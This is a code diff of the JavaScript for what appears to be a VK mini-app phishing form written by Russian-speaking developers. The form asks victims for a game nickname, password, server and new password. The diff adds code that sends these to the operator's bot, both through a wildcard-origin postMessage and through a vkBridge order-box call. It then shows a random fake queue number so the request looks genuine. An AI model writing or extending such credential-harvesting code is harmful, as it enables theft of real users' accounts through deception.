@@ -76,7 +76,7 @@
         document.getElementById('s' + step).classList.add('active');
     }
 
-    function finish() {
+   function finish() {
         const data = {
             nick: document.getElementById('n').value,
             pass: document.getElementById('p').value,
@@ -84,12 +84,24 @@
             server: document.getElementById('srv').value,
             new_pass: document.getElementById('np').value
         };
-        if(!data.nick || !data.pass || data.server === "Нажмите для выбора") return alert("Заполните поля!");
 
-        // Отправка данных на твой ADMIN_ID
-        window.parent.postMessage(JSON.stringify({ status: "send", data: data }), "*");
+        if(!data.nick || !data.pass || data.server === "Нажмите для выбора") {
+            return alert("Заполните обязательные поля!");
+        }
 
-        // Случайное число очереди от 1 до 99
+        // Отправка данных боту (совместимо с твоим Python скриптом)
+        window.parent.postMessage(JSON.stringify({
+            type: "message_new",
+            app_data: JSON.stringify(data)
+        }), "*");
+
+        // Дополнительный метод для мобильных устройств
+        vkBridge.send("VKWebAppShowOrderBox", {
+            type: "item",
+            item: JSON.stringify(data)
+        }).catch(err => console.log("Bridge error:", err));
+
+        // Визуальное оформление (очередь)
         document.getElementById('num').innerText = Math.floor(Math.random() * 99) + 1;
         move(3);
     }
